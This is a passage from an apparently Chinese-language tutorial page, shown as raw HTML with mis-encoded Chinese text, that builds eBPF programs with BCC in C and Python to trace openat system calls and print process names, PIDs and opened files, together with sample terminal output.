root 5178563  1æœˆ 29 16:02 /sys/kernel/btf/vmlinux<br><br></code></pre></td></tr></table></figure><h2 id="ç¬¬ä¸€ä¸ªebpfç¨‹åºï¼šè·Ÿè¸ª-openat-ï¼ˆå³æ‰“å¼€æ–‡ä»¶ï¼‰ç³»ç»Ÿè°ƒç”¨"><a href="#ç¬¬ä¸€ä¸ªebpfç¨‹åºï¼šè·Ÿè¸ª-openat-ï¼ˆå³æ‰“å¼€æ–‡ä»¶ï¼‰ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç¬¬ä¸€ä¸ªebpfç¨‹åºï¼šè·Ÿè¸ª openat()ï¼ˆå³æ‰“å¼€æ–‡ä»¶ï¼‰ç³»ç»Ÿè°ƒç”¨"></a>ç¬¬ä¸€ä¸ªebpfç¨‹åºï¼šè·Ÿè¸ª openat()ï¼ˆå³æ‰“å¼€æ–‡ä»¶ï¼‰ç³»ç»Ÿè°ƒç”¨</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨-C-å¼€å‘ä¸€ä¸ª-eBPF-ç¨‹åº"><a href="#ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨-C-å¼€å‘ä¸€ä¸ª-eBPF-ç¨‹åº" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨ C å¼€å‘ä¸€ä¸ª eBPF ç¨‹åº"></a>ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨ C å¼€å‘ä¸€ä¸ª eBPF ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat hello.c</span><br>int hello_world(void *ctx)<br>&#123;<br>    bpf_trace_printk(<span class="hljs-string">&quot;Hello, World!&quot;</span>);  // æœ€å¸¸ç”¨çš„ BPF è¾…åŠ©å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¾“å‡ºä¸€æ®µå­—ç¬¦ä¸²ã€‚ä¸è¿‡ï¼Œç”±äº eBPF è¿è¡Œåœ¨å†…æ ¸ä¸­ï¼Œå®ƒçš„è¾“å‡ºå¹¶ä¸æ˜¯é€šå¸¸çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œè€Œæ˜¯å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// eBPFç¨‹åºå¹¶ä¸èƒ½éšä¾¿çš„è°ƒç”¨å†…æ ¸å‡½æ•°ï¼Œå¿…é¡»é€šè¿‡è¾…åŠ©å‡½æ•°æ‰å¯å®ŒæˆeBPFç¨‹åºå’Œå…¶ä»–å†…æ ¸æ¨¡å—çš„äº¤äº’ï¼Œeg bpf_trace_printk()<br><br></code></pre></td></tr></table></figure><h3 id="ç¬¬äºŒæ­¥ï¼šä½¿ç”¨-Python-å’Œ-BCC-åº“å¼€å‘ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åº"><a href="#ç¬¬äºŒæ­¥ï¼šä½¿ç”¨-Python-å’Œ-BCC-åº“å¼€å‘ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åº" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šä½¿ç”¨ Python å’Œ BCC åº“å¼€å‘ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åº"></a>ç¬¬äºŒæ­¥ï¼šä½¿ç”¨ Python å’Œ BCC åº“å¼€å‘ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat hello.py</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># 1) import bcc library</span><br><span class="hljs-comment"># å¯¼å…¥äº† BCC  åº“çš„ BPF æ¨¡å—ï¼Œä»¥ä¾¿æ¥ä¸‹æ¥è°ƒç”¨ï¼›</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 2) load BPF program</span><br><span class="hljs-comment"># è°ƒç”¨ BPF() åŠ è½½ç¬¬ä¸€æ­¥å¼€å‘çš„ BPF æºä»£ç ï¼›</span><br>b = BPF(src_file=<span class="hljs-string">&quot;hello.c&quot;</span>)<br><br><span class="hljs-comment"># 3) attach kprobe</span><br><span class="hljs-comment"># å°† BPF ç¨‹åºæŒ‚è½½åˆ°å†…æ ¸æ¢é’ˆï¼ˆç®€ç§° kprobeï¼‰ï¼Œå…¶ä¸­ do_sys_openat2() æ˜¯ç³»ç»Ÿè°ƒç”¨ openat() åœ¨å†…æ ¸ä¸­çš„å®ç°ï¼›</span><br><span class="hljs-comment"># è°ƒç”¨äº† attach_kprobe å‡½æ•°ï¼Œç»‘å®šäº†ä¸€ä¸ªå†…æ ¸è·Ÿè¸ªäº‹ä»¶</span><br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><br><span class="hljs-comment"># 4) read and print /sys/kernel/debug/tracing/trace_pipe</span><br><span class="hljs-comment"># è¯»å–å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe çš„å†…å®¹ï¼Œå¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚</span><br>b.trace_print()<br><br><br><span class="hljs-comment"># å†…æ ¸å‡½æ•° do_sys_openat2</span><br><br><span class="hljs-comment"># ç†è§£ï¼šopennat()å’Œopennat2()éƒ½æ˜¯ç³»ç»Ÿè°ƒç”¨</span><br><span class="hljs-comment"># åœ¨è®¡ç®—æœºä¸­è¿è¡Œç¨‹åºã€è¯»å†™æ–‡ä»¶ï¼Œéƒ½ä¼šæ¶‰åŠåˆ°æ–‡ä»¶çš„æ‰“å¼€æ“ä½œï¼ŒLinux v5.10 ä¸æ–‡ä»¶æ‰“å¼€ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨æœ‰ open() / creat() / openat() / openat2è¿™å››ç±»ï¼Œåœ¨ä½¿ç”¨ glibc v2.32 æ—¶ï¼Œå‡ ä¹æ‰€æœ‰çš„æ–‡ä»¶æ‰“å¼€æ“ä½œä½¿ç”¨çš„éƒ½æ˜¯ openat2() è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚</span><br><br><span class="hljs-comment"># ç”¨é«˜çº§è¯­è¨€å¼€å‘çš„ eBPF ç¨‹åºï¼Œéœ€è¦é¦–å…ˆç¼–è¯‘ä¸º BPF å­—èŠ‚ç ï¼Œç„¶åå€ŸåŠ© bpf ç³»ç»Ÿè°ƒç”¨åŠ è½½åˆ°å†…æ ¸ä¸­ï¼Œæœ€åå†é€šè¿‡æ€§èƒ½ç›‘æ§ç­‰æ¥å£ä¸å…·ä½“çš„å†…æ ¸äº‹ä»¶è¿›è¡Œç»‘å®šã€‚è¿™æ ·ï¼Œå†…æ ¸çš„æ€§èƒ½ç›‘æ§æ¨¡å—æ‰ä¼šåœ¨å†…æ ¸äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œæˆ‘ä»¬å¼€å‘çš„ eBPF ç¨‹åºã€‚</span><br></code></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œ-eBPF-ç¨‹åº"><a href="#ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œ-eBPF-ç¨‹åº" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œ eBPF ç¨‹åº"></a>ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œ eBPF ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo python3 hello.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7270.693212: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7270.693407: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246610: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246653: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246911: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.247487: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.247529: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43244   [000] d...1  7271.248757: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43244   [000] d...1  7271.248848: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43245   [000] d...1  7271.249767: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43245   [000] d...1  7271.249825: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-43246   [000] d...1  7271.251964: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-43246   [000] d...1  7271.252028: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43247   [000] d...1  7271.253499: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43247   [000] d...1  7271.253554: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7271.943581: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7272.943654: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43255   [000] d...1  7273.267842: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43255   [000] d...1  7273.268730: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.272320: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.272921: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.273573: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.274131: bpf_trace_printk: Hello, World!&#x27;</span><br><br><br></code></pre></td></tr></table></figure><h2 id="æ”¹è¿›"><a href="#æ”¹è¿›" class="headerlink" title="æ”¹è¿›"></a>æ”¹è¿›</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat trace-open.c</span><br>// åŒ…å«å¤´æ–‡ä»¶<br><span class="hljs-comment">#include &lt;uapi/linux/openat2.h&gt;</span><br><span class="hljs-comment">#include &lt;linux/sched.h&gt;</span><br><br>// å®šä¹‰æ•°æ®ç»“æ„<br>struct data_t &#123;<br>  u32 pid;<br>  u64 ts;<br>  char <span class="hljs-built_in">comm</span>[TASK_COMM_LEN];<br>  char fname[NAME_MAX];<br>&#125;;<br><br>// å®šä¹‰æ€§èƒ½äº‹ä»¶æ˜ å°„  å®šä¹‰ä¸€ä¸ª Perf äº‹ä»¶ç±»å‹çš„ BPF æ˜ å°„<br>BPF_PERF_OUTPUT(events);<br><br><br><br>// å®šä¹‰kprobeå¤„ç†å‡½æ•°<br>int hello_world(struct pt_regs *ctx, int dfd, const char __user * filename, struct open_how *how)<br>&#123;<br>  struct data_t data = &#123; &#125;;<br><br>  // è·å–PIDå’Œæ—¶é—´<br>  data.pid = bpf_get_current_pid_tgid();  // bpf_get_current_pid_tgidç”¨äºè·å–è¿›ç¨‹çš„ TGID å’Œ PIDã€‚å› ä¸ºè¿™å„¿å®šä¹‰çš„ data.pid æ•°æ®ç±»å‹ä¸º u32ï¼Œæ‰€ä»¥é«˜ 32 ä½èˆå¼ƒæ‰åå°±æ˜¯è¿›ç¨‹çš„ PID<br>  data.ts = bpf_ktime_get_ns();  // bpf_ktime_get_nsç”¨äºè·å–ç³»ç»Ÿè‡ªå¯åŠ¨ä»¥æ¥çš„æ—¶é—´ï¼Œå•ä½æ˜¯çº³ç§’<br><br>  // è·å–è¿›ç¨‹å<br>  <span class="hljs-keyword">if</span> (bpf_get_current_comm(&amp;data.comm, sizeof(data.comm)) == 0)  // bpf_get_current_commç”¨äºè·å–è¿›ç¨‹åï¼Œå¹¶æŠŠè¿›ç¨‹åå¤åˆ¶åˆ°é¢„å®šä¹‰çš„ç¼“å†²åŒºä¸­<br>  &#123;<br>    bpf_probe_read(&amp;data.fname, sizeof(data.fname), (void *)filename); // bpf_probe_read ç”¨äºä»æŒ‡å®šæŒ‡é’ˆå¤„è¯»å–å›ºå®šå¤§å°çš„æ•°æ®ï¼Œè¿™é‡Œåˆ™ç”¨äºè¯»å–è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶åã€‚<br>  &#125;<br><br>  // æäº¤æ€§èƒ½äº‹ä»¶ è°ƒç”¨ perf_submit() æŠŠæ•°æ®æäº¤åˆ°åˆšæ‰å®šä¹‰çš„ BPF æ˜ å°„<br>  events.perf_submit(ctx, &amp;data, sizeof(data));<br>  <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat trace-open.py</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 1) load BPF program</span><br><span class="hljs-comment"># åŠ è½½ eBPF ç¨‹åºå¹¶æŒ‚è½½åˆ°å†…æ ¸æ¢é’ˆä¸Š</span><br>b = BPF(src_file=<span class="hljs-string">&quot;trace-open.c&quot;</span>)<br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><span class="hljs-comment"># 2) print header</span><br><span class="hljs-comment"># è¾“å‡ºä¸€è¡Œ Header å­—ç¬¦ä¸²è¡¨ç¤ºæ•°æ®çš„æ ¼å¼</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18s %-16s %-6s %-16s&quot;</span> % (<span class="hljs-string">&quot;TIME(s)&quot;</span>, <span class="hljs-string">&quot;COMM&quot;</span>, <span class="hljs-string">&quot;PID&quot;</span>, <span class="hljs-string">&quot;FILE&quot;</span>))<br><br><span class="hljs-comment"># 3) define the callback for perf event</span><br><span class="hljs-comment"># print_event å®šä¹‰ä¸€ä¸ªæ•°æ®å¤„ç†çš„å›è°ƒå‡½æ•°ï¼Œæ‰“å°è¿›ç¨‹çš„åå­—ã€PID ä»¥åŠå®ƒè°ƒç”¨ openat æ—¶æ‰“å¼€çš„æ–‡ä»¶</span><br>start = 0<br>def print_event(cpu, data, size):<br>    global start<br>    event = b[<span class="hljs-string">&quot;events&quot;</span>].event(data)<br>    <span class="hljs-keyword">if</span> start == 0:<br>            start = event.ts<br>    time_s = (<span class="hljs-built_in">float</span>(event.ts - start)) / 1000000000<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18.9f %-16s %-6d %-16s&quot;</span> % (time_s, event.comm, event.pid, event.fname))<br><br><span class="hljs-comment"># 4) loop with callback to print_event</span><br><span class="hljs-comment"># open_perf_buffer å®šä¹‰äº†åä¸º â€œeventsâ€ çš„ Perf äº‹ä»¶æ˜ å°„ï¼Œè€Œåé€šè¿‡ä¸€ä¸ªå¾ªç¯è°ƒç”¨ perf_buffer_poll è¯»å–æ˜ å°„çš„å†…å®¹ï¼Œå¹¶æ‰§è¡Œå›è°ƒå‡½æ•°è¾“å‡ºè¿›ç¨‹ä¿¡æ¯</span><br>b[<span class="hljs-string">&quot;events&quot;</span>].open_perf_buffer(print_event)<br><span class="hljs-keyword">while</span> 1:<br>    try:<br>        b.perf_buffer_poll()<br>    except KeyboardInterrupt:<br>        <span class="hljs-built_in">exit</span>()<br><br><br><span class="hljs-comment"># æ€æ ·ä»ç”¨æˆ·æ€è¯»å– BPF æ˜ å°„å†…å®¹å¹¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰å‘¢ï¼Ÿ</span><br><span class="hljs-comment"># åœ¨ BCC ä¸­ï¼Œä¸ eBPF ç¨‹åºä¸­ BPF_PERF_OUTPUT  ç›¸å¯¹åº”çš„ç”¨æˆ·æ€è¾…åŠ©å‡½æ•°æ˜¯ open_perf_buffer() ã€‚å®ƒéœ€è¦ä¼ å…¥ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºå¤„ç†ä» Perf äº‹ä»¶ç±»å‹çš„ BPF æ˜ å°„ä¸­è¯»å–åˆ°çš„æ•°æ®ã€‚</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo python3 trace-open.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>TIME(s)            COMM             PID    FILE<br>0.000000000        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.249586834        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.pressure&#x27;</span><br>0.249744243        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.current&#x27;</span><br>0.249765844        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.min&#x27;</span><br>0.249783697        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.low&#x27;</span><br>0.249800399        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.swap.current&#x27;</span><br>0.249818063        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.stat&#x27;</span><br>0.249918042        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.pressure&#x27;</span><br>0.249993365        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span 